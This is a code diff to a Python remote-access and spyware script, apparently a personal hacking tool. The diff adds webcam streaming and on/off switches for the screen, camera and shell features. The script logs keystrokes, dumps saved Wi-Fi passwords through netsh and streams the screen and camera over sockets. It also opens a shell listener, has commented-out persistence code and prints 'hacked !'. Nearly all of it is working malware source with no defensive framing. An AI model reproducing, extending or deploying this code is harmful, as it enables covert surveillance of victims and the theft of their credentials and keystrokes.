@@ -8,7 +8,7 @@ Created on Dec 23 2020
 from logging import info
 from pynput.keyboard import Key, Listener
 from shutil import copyfile
-import logging, threading, subprocess, socket, zlib, mss, argparse, sys
+import logging, threading, subprocess, socket, zlib, mss, argparse, sys, cv2, math, struct
 
 #copy the file in a place where it's gona be launched in every start # never tryed
 """import os
@@ -21,6 +21,9 @@ def parseargs():
     cli_args.add_argument('--port',help="stream port, reverse shell port = stream port +1", default=5000, type=int)
     cli_args.add_argument('--keylog',help="keylog=t create a keylogger file / keylog=f don\'t create the file", default="t", type=str)
     cli_args.add_argument('--wifi',help="wifi=t create a file with all wifis password / wifi=f don't create the file", default="t", type=str)
+    cli_args.add_argument('--camera',help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream", default="t", type=str)
+    cli_args.add_argument('--screen',help="screen=t stream screen on port+2 (default = 5002)/ screen=f don't stream", default="t", type=str)
+    cli_args.add_argument('--shell',help="shell=t revershell on port (default = 5000)/ shell=f don't revershell", default="t", type=str)
     options = cli_args.parse_args(sys.argv[1:])
     return options
 
@@ -29,6 +32,8 @@ def key_handler(key):
 def keylog():
     with Listener(on_press=key_handler) as listener:
         listener.join()
+
+
 def wifipass():
     fichier = open("wifis.txt", "w")
     data = subprocess.check_output(['netsh','wlan', 'show' , 'profiles'], encoding="437").split('\n')
@@ -41,9 +46,9 @@ def wifipass():
         except IndexError:
             1
     fichier.close()
-def retreive_screenshot(conn):
-    """ Envoi des captures d'écran via un socket. """
 
+
+def retreive_screenshot(conn):
     with mss.mss() as sct:
         # La région de l'écran à capturer
         rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}
@@ -72,6 +77,8 @@ def screen_sender(host='0.0.0.0', port=5000):
             #print('Client connected IP:', addr)
             threadscreen2 = threading.Thread(target=retreive_screenshot, args=(conn,))
             threadscreen2.start()
+
+
 def R_tcp(host='0.0.0.0', port=5001):
   s = socket.socket()
   BUFFER_SIZE = 1024
@@ -92,6 +99,37 @@ def R_tcp(host='0.0.0.0', port=5001):
   client_socket.close()
   s.close()
 
+
+def capturevid(conn):
+    cap = cv2.VideoCapture(0)
+    while (cap.isOpened()):
+        _, frame = cap.read()
+        compress_img = cv2.imencode('.jpg', frame)[1]
+        dat = compress_img.tostring()
+        size = len(dat)
+        count = math.ceil(size/(MAX_IMAGE_DGRAM))
+        array_pos_start = 0
+        while count:
+            array_pos_end = min(size, array_pos_start + MAX_IMAGE_DGRAM)
+            conn.send(struct.pack("B", count)  +dat[array_pos_start:array_pos_end])
+            array_pos_start = array_pos_end
+            count -= 1
+    cap.release()
+    cv2.destroyAllWindows()
+    conn.close()
+def camsender(port=5000):
+    host="0.0.0.0"
+    with socket.socket() as sock:
+        sock.bind((host, port))
+        sock.listen(5)
+        print('Server started.')
+
+        while 'connected':
+            conn, addr = sock.accept()
+            print('Client connected IP:', addr)
+            thread = threading.Thread(target=capturevid, args=(conn,))
+            thread.start()
+
 if __name__ == "__main__":
     #parse args for socket connection
     options=parseargs()
@@ -104,14 +142,21 @@ if __name__ == "__main__":
     if (options.wifi=="t"):
         wifipass()
     #screen sender udp
-    WIDTH = 1900
-    HEIGHT = 1000
-    threadscreen = threading.Thread(target=screen_sender,args=(options.host,options.port)) # port 5000
-    threadscreen.start()
+    if (options.screen=="t"):
+        WIDTH = 1900
+        HEIGHT = 1000
+        threadscreen = threading.Thread(target=screen_sender,args=(options.host,options.port)) # port 5000
+        threadscreen.start()
     #Reverse shell tcp 
-    threadshell = threading.Thread(target=R_tcp,args=(options.host,options.port+1)) #port 5001
-    threadshell.start()
-
+    if (options.shell=="t"):
+        threadshell = threading.Thread(target=R_tcp,args=(options.host,options.port+1)) #port 5001
+        threadshell.start()
+    #camera sender udp
+    if (options.camera=="t"):
+        MAX_DGRAM = 2**16
+        MAX_IMAGE_DGRAM = MAX_DGRAM - 64 # extract 64 bytes in case UDP frame overflown
+        threadshell = threading.Thread(target=camsender,args=(options.port+2,)) #port 5002
+        threadshell.start()
     #suite
     print("hacked !")
 
